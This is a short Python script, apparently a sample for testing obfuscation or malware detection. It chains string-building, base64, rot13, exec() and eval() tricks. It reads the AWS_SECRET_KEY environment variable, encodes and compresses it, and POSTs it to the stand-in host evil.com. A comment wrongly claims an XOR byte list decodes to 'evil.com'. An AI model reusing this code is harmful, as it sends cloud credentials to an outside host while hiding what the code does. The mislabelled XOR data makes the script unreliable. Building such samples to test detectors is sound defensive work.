import os
import base64
import zlib
import requests
import codecs

command = chr(119) + chr(104) + chr(111) + chr(97) + chr(109) + chr(105)
print(f"Built command: {command}")  # Just for demonstration

xor_key = 0x5A
xor_data = [0x0B, 0x3B, 0x2C, 0x2A, 0x1A, 0x2B, 0x3C, 0x36, 0x2C]  # XOR of "evil.com"
decoded = ''.join(chr(c ^ xor_key) for c in xor_data)
encoded_payload = "cHJpbnQoIkhpZGRlbiBwYXlsb2FkIGV4ZWN1dGVkISIp"
decoded_payload = base64.b64decode(encoded_payload).decode()
exec(decoded_payload)  # This will print "Hidden payload executed!"

module_name = "o" + "s"
my_os = __import__(module_name)
token = my_os.getenv("AWS_SECRET_KEY")

rot13_encoded = "cevag('Uryyb sebz ebg13')"
decoded_code = codecs.decode(rot13_encoded, 'rot_13')
eval(decoded_code)

url = "redis://user:pass123@localhost:6379"
a = token
b = a

b = b.encode()
b = base64.b64encode(b)
b = zlib.compress(b)

requests.post(
    "http://evil.com/upload",
    data=b
)

(lambda x: (lambda y: (lambda z: z * 2)(y * 3))(x * 2))(5)